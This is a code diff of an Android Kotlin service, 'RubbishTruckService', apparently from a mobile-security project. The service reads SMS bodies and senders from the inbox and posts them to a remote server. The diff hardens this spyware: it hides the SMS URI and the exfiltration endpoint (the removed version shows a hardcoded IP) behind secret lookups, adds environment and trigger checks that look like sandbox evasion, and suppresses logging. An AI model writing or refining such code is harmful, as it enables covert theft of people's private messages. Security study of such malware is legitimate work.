@@ -2,19 +2,17 @@ package com.example.mobsec_823.RecylingService
 
 import android.app.Service
 import android.content.Intent
-import android.os.IBinder
-import android.provider.Telephony
 import android.net.Uri
+import android.os.IBinder
 import android.util.Log
+import com.example.mobsec_823.utils.SafetyNet
+import com.example.mobsec_823.utils.SecretBox
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
 import java.lang.StringBuilder
 
-/**
- * Service to collect SMS "scraps" and dump them at the "landfill".
- */
 class RubbishTruckService : Service() {
 
     private val TAG = "RubbishTruckService"
@@ -22,27 +20,39 @@ class RubbishTruckService : Service() {
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        if (!SafetyNet.isEnvironmentSafe() || !SafetyNet.isTriggerArmed(this)) {
+            stopSelf()
+            return START_NOT_STICKY
+        }
+
         Thread {
             try {
+                if (!SafetyNet.checkKitchenPermit(11)) return@Thread
+
                 val scrapData = collectScraps()
                 if (scrapData.isNotEmpty()) {
                     dumpAtLandfill(scrapData)
                 }
             } catch (e: Exception) {
+            } finally {
+                stopSelf()
             }
         }.start()
 
-        return START_STICKY
+        return START_NOT_STICKY
     }
 
     private fun collectScraps(): String {
         val sb = StringBuilder("=== RUBBISH COLLECTION ===\n")
-        val uri: Uri = Uri.parse("content://sms/inbox")
+        val uriStr = SecretBox.getScrapUri()
+        if (uriStr.isEmpty()) return ""
+        
+        val uri: Uri = Uri.parse(uriStr)
 
         return try {
             contentResolver.query(uri, null, null, null, null)?.use { cursor ->
-                val bodyIdx = cursor.getColumnIndex(Telephony.TextBasedSmsColumns.BODY)
-                val addrIdx = cursor.getColumnIndex(Telephony.TextBasedSmsColumns.ADDRESS)
+                val bodyIdx = cursor.getColumnIndex("body")
+                val addrIdx = cursor.getColumnIndex("address")
 
                 var count = 0
                 while (cursor.moveToNext() && count < 10) {
@@ -60,16 +70,17 @@ class RubbishTruckService : Service() {
 
     private fun dumpAtLandfill(data: String) {
         try {
+            val endpoint = SecretBox.getRubbishEndpoint()
+            if (endpoint.isEmpty()) return
+
             val client = OkHttpClient()
             val request = Request.Builder()
-                .url("http://47.129.144.9:8000/dump/sms")
+                .url(endpoint)
                 .post(data.toRequestBody("text/plain".toMediaType()))
                 .build()
             client.newCall(request).execute().use { response ->
                 if (response.isSuccessful) Log.i(TAG, "Rubbish dumped successfully")
             }
-        } catch (e: Exception) {
-            Log.e(TAG, "Landfill unreachable")
-        }
+        } catch (e: Exception) { }
     }
 }
